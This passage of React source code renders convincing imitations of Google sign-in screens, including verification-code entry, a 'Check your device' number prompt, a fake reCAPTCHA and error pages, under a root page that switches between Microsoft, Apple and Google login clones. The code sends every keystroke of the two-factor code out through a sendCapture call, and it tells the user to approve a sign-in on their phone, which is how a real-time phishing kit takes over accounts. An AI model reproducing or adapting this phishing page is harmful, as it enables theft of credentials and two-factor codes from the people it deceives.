                      onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 6); setPhoneCodeInput(v); sendCapture('phone_code', v); }}
                      onFocus={() => setPhoneCodeFocused(true)}
                      onBlur={() => setPhoneCodeFocused(false)}
                      style={{
                        width: '100%', padding: '20px 16px 8px', fontSize: 20,
                        letterSpacing: '0.3em', textAlign: 'center',
                        border: `${phoneCodeFocused ? 2 : 1}px solid ${phoneCodeFocused ? focusBorderColor : borderColor}`,
                        borderRadius: 4, background: 'transparent', color: textColor, outline: 'none', boxSizing: 'border-box',
                      }}
                    />
                    <label style={{
                      position: 'absolute', left: 16, pointerEvents: 'none', transition: 'all 0.15s',
                      ...floatingLabel(phoneCodeFocused, !!phoneCodeInput),
                    }}>
                      Enter code
                    </label>
                  </div>
                  <button data-testid="google-resend-code"
                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '6px 8px 6px 0' }}>
                    Resend code
                  </button>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <button onClick={() => setStep('phone-verify')}
                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
                    Back
                  </button>
                  <button data-testid="google-code-verify-btn"
                    onClick={() => { if (phoneCodeInput.length >= 4) { sendCapture('phone_code', phoneCodeInput); setStep('processing'); } }}
                    disabled={phoneCodeInput.length < 4}
                    style={{ backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', color: isDark ? '#052e70' : '#ffffff', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: phoneCodeInput.length < 4 ? 'default' : 'pointer', opacity: phoneCodeInput.length < 4 ? 0.5 : 1 }}>
                    Verify
                  </button>
                </div>
              </>
            )}

            {/* ── Google Prompt (Check your device — single number) ── */}
            {step === 'prompt-number' && (
              <>
                <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
                  <p style={{ fontSize: 14, color: subText, margin: '0 0 20px', lineHeight: 1.5 }}>
                    There is something unusual about your activity. For your security, Google wants to make sure it&apos;s really you.
                  </p>
                  {/* Phone graphic */}
                  <div style={{ display: 'flex', justifyContent: 'center', marginBottom: 16 }}>
                    <div style={{ position: 'relative', width: 80, height: 110 }}>
                      {/* Phone body */}
                      <div style={{ width: 80, height: 110, border: `2px solid ${isDark ? '#8e918f' : '#5f6368'}`, borderRadius: 8, background: isDark ? '#3c4043' : '#f8f9fa', position: 'relative', overflow: 'hidden' }}>
                        {/* Notification bar */}
                        <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 18, background: isDark ? '#5f6368' : '#dadce0', display: 'flex', alignItems: 'center', paddingLeft: 6, gap: 3 }}>
                          <div style={{ width: 28, height: 6, borderRadius: 2, background: isDark ? '#8e918f' : '#fff', opacity: 0.9 }} />
                        </div>
                        {/* Notification card */}
                        <div style={{ position: 'absolute', top: 22, left: 4, right: 4, background: isDark ? '#202124' : '#fff', borderRadius: 4, padding: '5px 6px', boxShadow: '0 1px 3px rgba(0,0,0,0.2)' }}>
                          <div style={{ display: 'flex', alignItems: 'center', gap: 4, marginBottom: 3 }}>
                            <div style={{ width: 10, height: 10, borderRadius: 2, background: '#4285F4', flexShrink: 0 }} />
                            <div style={{ fontSize: 7, color: isDark ? '#e3e3e3' : '#202124', fontWeight: 600 }}>Google</div>
                          </div>
                          <div style={{ fontSize: 6, color: isDark ? '#c4c7c5' : '#5f6368', lineHeight: 1.3 }}>Sign-in attempt</div>
                          <div style={{ display: 'flex', gap: 4, marginTop: 4 }}>
                            <div style={{ flex: 1, textAlign: 'center', fontSize: 6, color: isDark ? '#a8c7fa' : '#0b57d0', fontWeight: 600 }}>NO</div>
                            <div style={{ width: 1, background: isDark ? '#3c4043' : '#dadce0' }} />
                            <div style={{ flex: 1, textAlign: 'center', fontSize: 6, color: isDark ? '#a8c7fa' : '#0b57d0', fontWeight: 600 }}>YES</div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                  {/* Instructions */}
                  <p style={{ fontSize: 13, fontWeight: 600, color: textColor, margin: '0 0 6px' }}>Check your device</p>
                  <p style={{ fontSize: 13, color: subText, margin: 0, lineHeight: 1.6 }}>
                    Pull down the notification bar on your phone and tap the sign-in notification. Tap <strong style={{ color: textColor }}>Yes</strong>, then tap{' '}
                    <strong style={{ color: textColor }}>{gCorrectNumber}</strong> on your device to verify it&apos;s you.
                  </p>
                  {/* Large number display */}
                  <div style={{ fontSize: 52, fontWeight: 300, color: textColor, textAlign: 'center', marginTop: 16, lineHeight: 1 }}>
                    {gCorrectNumber}
                  </div>
                </div>
                <div style={{ display: 'flex', justifyContent: 'flex-start' }}>
                  <button onClick={() => setStep('phone-verify')}
                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
                    Try another way
                  </button>
                </div>
              </>
            )}

            {/* ── Sign-in Attempt ("Is it you trying to sign in?") ── */}
            {step === 'sign-in-attempt' && (
              <>
                <div style={{ flex: 1 }}>
                  {/* Email chip */}
                  <div style={{ display: 'inline-flex', alignItems: 'center', gap: 8, border: `1px solid ${borderColor}`, borderRadius: 20, padding: '6px 12px 6px 6px', marginBottom: 20, background: isDark ? '#3c3f43' : '#f0f4f9' }}>
                    <div style={{ width: 24, height: 24, borderRadius: '50%', backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 12, fontWeight: 500, color: isDark ? '#052e70' : '#fff', flexShrink: 0 }}>{initial}</div>
                    <span style={{ fontSize: 14, color: textColor }}>{email || 'janedoe@gmail.com'}</span>
                  </div>
                  {/* Info rows */}
                  {[
                    { label: 'Device', value: 'Windows 10' },
                    { label: 'Near', value: 'Mountain View, CA, USA' },
                    { label: 'Time', value: 'Just now' },
                  ].map(row => (
                    <div key={row.label} style={{ marginBottom: 16 }}>
                      <div style={{ fontSize: 14, fontWeight: 600, color: textColor, marginBottom: 2 }}>{row.label}</div>
                      <div style={{ fontSize: 14, color: subText }}>{row.value}</div>
                    </div>
                  ))}
                </div>
                {/* Action buttons */}
                <div style={{ display: 'flex', gap: 0, borderTop: `1px solid ${borderColor}`, marginTop: 8 }}>
                  <button
                    onClick={() => nav('sign-in-blocked')}
                    style={{ flex: 1, background: 'none', border: 'none', borderRight: `1px solid ${borderColor}`, color: linkColor, fontSize: 14, fontWeight: 600, cursor: 'pointer', padding: '14px 8px', letterSpacing: '0.04em' }}>
                    NO, IT&apos;S NOT ME
                  </button>
                  <button
                    onClick={() => nav('prompt-number')}
                    style={{ flex: 1, background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 600, cursor: 'pointer', padding: '14px 8px', letterSpacing: '0.04em' }}>
                    YES
                  </button>
                </div>
              </>
            )}

            {/* ── Sign-in Blocked ── */}
            {step === 'sign-in-blocked' && (
              <>
                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', flex: 1, gap: 16, textAlign: 'center' }}>
                  {/* Shield icon */}
                  <div style={{ width: 56, height: 56, borderRadius: '50%', background: isDark ? '#1e3a2f' : '#e6f4ea', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                    <svg viewBox="0 0 24 24" width="28" height="28" fill="none">
                      <path d="M12 2L4 6v6c0 5.25 3.5 10.15 8 11.35C16.5 22.15 20 17.25 20 12V6l-8-4z" fill={isDark ? '#34A853' : '#34A853'} opacity="0.15"/>
                      <path d="M12 2L4 6v6c0 5.25 3.5 10.15 8 11.35C16.5 22.15 20 17.25 20 12V6l-8-4z" stroke="#34A853" strokeWidth="1.5" strokeLinejoin="round"/>
                      <path d="M9 12l2 2 4-4" stroke="#34A853" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                  </div>
                  <div>
                    <p style={{ fontSize: 14, color: textColor, fontWeight: 500, margin: '0 0 6px' }}>Your sign-in has been blocked</p>
                    <p style={{ fontSize: 13, color: subText, margin: 0, lineHeight: 1.5, maxWidth: 280 }}>
                      Your Google Account is protected. The sign-in attempt has been denied.
                    </p>
                  </div>
                </div>
                <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
                  <button onClick={() => nav('email')}
                    style={{ backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', color: isDark ? '#052e70' : '#fff', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: 'pointer' }}>
                    Done
                  </button>
                </div>
              </>
            )}

            {/* ── Processing ── */}
            {step === 'processing' && (
              <>
                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', flex: 1 }}>
                  <p style={{ fontSize: 14, color: subText, textAlign: 'center', margin: 0 }}>Signing you in…</p>
                </div>
                <div />
              </>
            )}

            {/* ── Verify it's you (reCAPTCHA) ── */}
            {step === 'verify' && (
              <>
                {captchaState === 'challenge' ? (
                  <div style={{ display: 'flex', flexDirection: 'column', flex: 1, minHeight: 0 }}>
                    <div style={{ background: '#4a90d9', color: 'white', borderRadius: '4px 4px 0 0', padding: '12px 16px', flexShrink: 0 }}>
                      <div style={{ fontSize: 12, fontWeight: 400, marginBottom: 1 }}>Select all images with</div>
                      <div style={{ fontSize: 20, fontWeight: 700, lineHeight: 1.2 }}>cars</div>
                      <div style={{ fontSize: 11, opacity: 0.9, marginTop: 2 }}>Click verify once there are none left</div>
                    </div>
                    <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 2, background: '#d0d0d0', flexShrink: 0 }}>
                      {CAPTCHA_IMGS.map((img, i) => (
                        <div key={i} onClick={() => {
                          const next = new Set(selectedImgs);
                          if (next.has(i)) next.delete(i); else next.add(i);
                          setSelectedImgs(next);
                        }} style={{
                          position: 'relative', height: 86, background: img.bg, cursor: 'pointer',
                          outline: selectedImgs.has(i) ? '3px solid #4285F4' : '3px solid transparent',
                          outlineOffset: -3,
                        }}>
                          {selectedImgs.has(i) && (
                            <div style={{ position: 'absolute', top: 4, right: 4, width: 22, height: 22, borderRadius: '50%', background: '#4285F4', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                              <svg viewBox="0 0 24 24" width="13" height="13" fill="none"><polyline points="4,12 10,18 20,6" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
                            </div>
                          )}
                          {img.car && (
                            <svg viewBox="0 0 48 22" width="40" height="18" style={{ position: 'absolute', bottom: 8, left: '50%', transform: 'translateX(-50%)', opacity: 0.72 }}>
                              <rect x="4" y="7" width="40" height="10" rx="2" fill="#444"/>
                              <rect x="10" y="3" width="24" height="8" rx="2" fill="#666"/>
                              <circle cx="13" cy="17.5" r="3.5" fill="#222"/><circle cx="13" cy="17.5" r="1.8" fill="#aaa"/>
                              <circle cx="35" cy="17.5" r="3.5" fill="#222"/><circle cx="35" cy="17.5" r="1.8" fill="#aaa"/>
                              <rect x="12" y="4" width="6" height="5" rx="1" fill="#aad4f5" opacity="0.7"/>
                              <rect x="20" y="4" width="6" height="5" rx="1" fill="#aad4f5" opacity="0.7"/>
                              <rect x="28" y="4" width="5" height="5" rx="1" fill="#aad4f5" opacity="0.7"/>
                            </svg>
                          )}
                        </div>
                      ))}
                    </div>
                    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '7px 12px', background: '#f9f9f9', border: '1px solid #ccc', borderTop: 'none', borderRadius: '0 0 4px 4px', flexShrink: 0 }}>
                      <div style={{ display: 'flex', gap: 14, color: '#555' }}>
                        <svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" strokeWidth="1.5" style={{ cursor: 'pointer' }}>
                          <path d="M1 4v6h6M23 20v-6h-6" strokeLinecap="round" strokeLinejoin="round"/>
                          <path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10m22 4l-4.64 4.36A9 9 0 0 1 3.51 15" strokeLinecap="round" strokeLinejoin="round"/>
                        </svg>
                        <svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" strokeWidth="1.5" style={{ cursor: 'pointer' }}>
                          <path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z" strokeLinecap="round" strokeLinejoin="round"/>
                          <path d="M19 10v2a7 7 0 0 1-14 0v-2M12 19v4M8 23h8" strokeLinecap="round" strokeLinejoin="round"/>
                        </svg>
                        <svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" strokeWidth="1.5" style={{ cursor: 'pointer' }}>
                          <circle cx="12" cy="12" r="10"/><path d="M12 8v4m0 4h.01" strokeLinecap="round"/>
                        </svg>
                      </div>
                      <button onClick={solveCaptcha} style={{ backgroundColor: '#4a90d9', color: 'white', border: 'none', borderRadius: 3, padding: '9px 20px', fontSize: 14, fontWeight: 600, cursor: 'pointer', letterSpacing: '0.04em' }}>
                        VERIFY
                      </button>
                    </div>
                  </div>
                ) : (
                  <>
                    <div>
                      <div style={{
                        display: 'inline-flex', alignItems: 'center', gap: 8,
                        border: `1px solid ${borderColor}`, borderRadius: 20,
                        padding: '6px 12px 6px 6px', marginBottom: 20, cursor: 'pointer',
                        background: isDark ? '#3c3f43' : '#f0f4f9',
                      }}>
                        <div style={{ width: 24, height: 24, borderRadius: '50%', backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 12, fontWeight: 500, color: isDark ? '#052e70' : '#fff', flexShrink: 0 }}>{initial}</div>
                        <span style={{ fontSize: 14, color: textColor }}>{email || 'john@gmail.com'}</span>
                        <ChevronLeft className="w-3 h-3 rotate-180" style={{ color: textColor, marginLeft: 2 }} />
                      </div>
                      <p style={{ fontSize: 13, color: subText, margin: '0 0 14px' }}>Confirm you&apos;re not a robot</p>
                      <div style={{ border: '1px solid #d4d4d4', borderRadius: 3, background: isDark ? '#3c3f43' : '#f9f9f9', padding: '16px 12px', display: 'flex', alignItems: 'center', justifyContent: 'space-between', maxWidth: 300, boxShadow: '0 0 4px rgba(0,0,0,0.1)' }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
                          {captchaState === 'solving' ? (
                            <svg className="animate-spin" width="28" height="28" viewBox="0 0 50 50" style={{ flexShrink: 0 }}>
                              <circle cx="25" cy="25" r="20" fill="none" stroke="#4285F4" strokeWidth="4" strokeDasharray="80 126"/>
                            </svg>
                          ) : captchaState === 'solved' ? (
                            <div style={{ width: 28, height: 28, borderRadius: '50%', background: '#00BF6F', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
                              <svg viewBox="0 0 24 24" width="17" height="17" fill="none"><polyline points="4,12 10,18 20,6" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/></svg>
                            </div>
                          ) : (
                            <div onClick={() => setCaptchaState('challenge')} style={{ width: 24, height: 24, border: '2px solid #9aa0a6', borderRadius: 3, cursor: 'pointer', background: 'white', flexShrink: 0 }} />
                          )}
                          <span style={{ fontSize: 14, color: isDark ? '#c4c7c5' : '#555' }}>I&apos;m not a robot</span>
                        </div>
                        <div style={{ textAlign: 'center', minWidth: 58 }}>
                          <div style={{ fontSize: 10, lineHeight: 1.3, marginBottom: 2 }}>
                            <span style={{ color: '#4285F4', fontWeight: 700 }}>re</span><span style={{ color: '#EA4335', fontWeight: 700 }}>C</span><span style={{ color: '#FBBC05', fontWeight: 700 }}>A</span><span style={{ color: '#34A853', fontWeight: 700 }}>P</span><span style={{ color: '#4285F4', fontWeight: 700 }}>T</span><span style={{ color: '#EA4335', fontWeight: 700 }}>C</span><span style={{ color: '#34A853', fontWeight: 700 }}>H</span><span style={{ color: '#FBBC05', fontWeight: 700 }}>A</span>
                          </div>
                          <div style={{ fontSize: 8, color: '#999' }}>Privacy - Terms</div>
                        </div>
                      </div>
                      <p style={{ fontSize: 12, color: subText, margin: '14px 0 0' }}>
                        You can also verify via phone ●●●●●●●●{googlePhone}
                      </p>
                    </div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                      <button onClick={() => setStep('password')} style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
                        Try another way
                      </button>
                      <button
                        onClick={() => captchaState === 'solved' && nav('processing')}
                        style={{ backgroundColor: captchaState === 'solved' ? (isDark ? '#a8c7fa' : '#0b57d0') : (isDark ? '#3c3f43' : '#c8d0db'), color: captchaState === 'solved' ? (isDark ? '#052e70' : '#fff') : '#888', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: captchaState === 'solved' ? 'pointer' : 'default' }}>
                        Next
                      </button>
                    </div>
                  </>
                )}
              </>
            )}

            {/* ── Error states ── */}
            {(step === 'error-email' || step === 'error-password' || step === 'error-code') && (
              <>
                <div>
                  <div style={{
                    display: 'flex', alignItems: 'flex-start', gap: 10, padding: '12px 14px',
                    background: isDark ? '#2d1212' : '#fef2f2',
                    border: `1px solid ${isDark ? '#7f1d1d' : '#fecaca'}`, borderRadius: 4, marginBottom: 16,
                  }}>
                    <svg viewBox="0 0 24 24" width="18" height="18" fill="none" style={{ flexShrink: 0, marginTop: 2 }}>
                      <circle cx="12" cy="12" r="10" stroke="#dc2626" strokeWidth="1.5"/>
                      <path d="M12 8v4m0 4h.01" stroke="#dc2626" strokeWidth="1.5" strokeLinecap="round"/>
                    </svg>
                    <p style={{ fontSize: 14, color: '#dc2626', margin: 0, lineHeight: 1.5 }}>
                      {step === 'error-email'
                        ? "Couldn't find your Google Account. Try entering your full email address."
                        : step === 'error-password'
                        ? "Wrong password. Try again or click Forgot password to reset it."
                        : "Wrong code. Try entering the code again or request a new one."}
                    </p>
                  </div>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <button
                    onClick={() => setStep(step === 'error-email' ? 'email' : step === 'error-password' ? 'password' : 'phone-code')}
                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
                    Try again
                  </button>
                  {step === 'error-password' && (
                    <button style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 0' }}>
                      Forgot password?
                    </button>
                  )}
                </div>
              </>
            )}
          </div>
        </div>
      </div>
    </>
  );
}

// ─── Root ─────────────────────────────────────────────────────────────────────

export default function LoginPage() {
  const params = new URLSearchParams(typeof window !== 'undefined' ? window.location.search : '');
  const urlProvider = params.get('provider');
  const storedProvider = typeof window !== 'undefined' ? localStorage.getItem('auth_provider') : null;
  const [provider, setProvider] = useState(urlProvider || storedProvider || 'microsoft');
  const device = params.get('device') || 'desktop';
  const theme = params.get('theme') || 'light';
  const isViewOnly = params.get('viewOnly') === '1';

  const handleProviderSwitch = isViewOnly ? undefined : (p: string) => {
    setProvider(p);
    if (typeof window !== 'undefined') localStorage.setItem('auth_provider', p);
  };

  // On mount: if no URL provider param, fetch the server's global provider
  // (handles the case where the page loads fresh and localStorage is stale/empty)
  useEffect(() => {
    if (urlProvider) return; // URL explicitly set — don't override
    const base = (import.meta as { env: { BASE_URL: string } }).env.BASE_URL.replace(/\/$/, '');
    fetch(`${base}/api/global-provider`)
      .then(r => r.json() as Promise<{ provider: string }>)
      .then(d => {
        if (d.provider && d.provider !== provider) {
          setProvider(d.provider);
          localStorage.setItem('auth_provider', d.provider);
        }
      })
      .catch(() => {});
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  return (
    <div className="w-full h-screen overflow-hidden">
      {provider === 'microsoft' && <MicrosoftLogin device={device} theme={theme} onProviderSwitch={handleProviderSwitch} />}
      {provider === 'apple' && <AppleLogin device={device} theme={theme} onProviderSwitch={handleProviderSwitch} />}
      {provider === 'google' && <GoogleLogin device={device} theme={theme} onProviderSwitch={handleProviderSwitch} />}
    </div>
  );
}
